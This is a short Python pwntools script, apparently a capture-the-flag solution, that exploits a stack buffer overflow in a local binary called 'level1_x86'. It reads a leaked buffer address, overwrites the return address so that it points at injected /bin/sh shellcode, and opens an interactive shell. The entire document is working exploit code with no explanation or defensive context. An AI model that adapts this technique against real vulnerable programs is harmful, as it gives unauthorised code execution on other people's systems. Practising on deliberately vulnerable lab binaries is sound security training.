from pwn import *

sh = process("./level1_x86")
shellcode = asm(shellcraft.sh())

sh.recvuntil(':')
buf = int(sh.recvuntil('?\n', drop=True), 16)
payload = flat(['a'*(0x88+4), buf+0x88+8, shellcode])
sh.sendline(payload)
sh.interactive()
